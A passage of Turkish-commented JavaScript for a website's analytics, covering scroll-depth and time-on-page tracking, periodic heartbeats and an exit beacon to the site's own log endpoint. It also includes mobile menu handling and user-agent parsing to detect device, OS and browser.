// 12) SAYFA KAYDIRMA & ZAMAN TAKİBİ
// ==========================================
function setupScrollTracking() {
    window.addEventListener('scroll', function() {
        var h = document.documentElement, b = document.body;
        var st = 'scrollTop', sh = 'scrollHeight';
        var percent = Math.round((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight) * 100);
        if (percent > STATE.maxScroll) {
            STATE.maxScroll = Math.min(percent, 100);
        }
    }, { passive: true });
}

function setupTimeTracking() {
    // Her 15 saniyede bir kalp atışı (Heartbeat) gönder
    setInterval(function() {
        syncInteractionToSupabase({
            time_spent_seconds: Math.round((Date.now() - STATE.startTime) / 1000),
            max_scroll_depth: STATE.maxScroll
        });
    }, 15000);

    // Sayfadan ayrılırken son durumu gönder
    window.addEventListener('beforeunload', function() {
        if (navigator.sendBeacon) {
            var finalPayload = JSON.stringify({
                fingerprint_hash: STATE.fingerprintHash,
                time_spent_seconds: Math.round((Date.now() - STATE.startTime) / 1000),
                max_scroll_depth: STATE.maxScroll
            });
            // Beacon desteği varsa log endpoint'ine de iletilir
            navigator.sendBeacon('/api/log', finalPayload);
        }
    });
}

// Mobil Menü Aç/Kapat
function setupMobileNav() {
    var toggle = document.getElementById('mobileToggle');
    var menu = document.getElementById('navMenu');
    if (toggle && menu) {
        toggle.addEventListener('click', function() {
            menu.classList.toggle('mobile-open');
        });
        menu.querySelectorAll('.nav-link').forEach(function(link) {
            link.addEventListener('click', function() {
                menu.classList.remove('mobile-open');
            });
        });
    }
}

// ==========================================
// CİHAZ, İŞLETİM SİSTEMİ VE TARAYICI TESPİT YARDIMCILARI
// ==========================================
function detectDeviceType() {
    var ua = navigator.userAgent;
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(ua)) return 'Mobil';
    return 'Masaüstü';
}

function detectOS() {
    var ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return 'Windows';
    if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    if (/Macintosh|Mac OS X/i.test(ua)) return 'macOS';
    if (/Android/i.test(ua)) return 'Android';
    if (/Linux/i.test(ua)) return 'Linux';
    return 'Bilinmiyor';
}

function detectOSVersion() {
    var ua = navigator.userAgent;
    var match = ua.match(/(Windows NT|Mac OS X|Android|OS) ([\d._]+)/);
    return match ? match[2].replace(/_/g, '.') : 'Bilinmiyor';
}

function detectBrowser() {
    var ua = navigator.userAgent;
    if (/Edg\//i.test(ua)) return 'Edge';
    if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) return 'Chrome';
    if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) return 'Safari';
    if (/Firefox\//i.test(ua)) return 'Firefox';
    if (/Opera|OPR\//i.test(ua)) return 'Opera';
    return 'Bilinmiyor';
}

function detectBrowserVersion() {
    var ua = navigator.userAgent;
    var match = ua.match(/(Chrome|Safari|Firefox|Edg|OPR)\/([\d.]+)/);
    return match ? match[2] : 'Bilinmiyor';
}
